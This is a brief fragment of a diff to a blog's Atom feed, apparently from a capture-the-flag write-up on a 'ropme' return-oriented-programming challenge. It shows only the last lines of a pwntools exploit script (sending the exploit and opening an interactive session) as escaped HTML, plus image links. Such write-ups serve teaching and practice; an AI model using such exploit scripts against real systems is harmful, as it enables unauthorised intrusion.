-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_last.png&quot; alt=&quot;ropme_leak_libc&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="pwning" /><summary type="html">Please read the disclaimer</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/flux_root.png&quot; alt=&quot;flux_root&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="box" /><summary type="html">Please read the disclamer</summary></entry></feed>
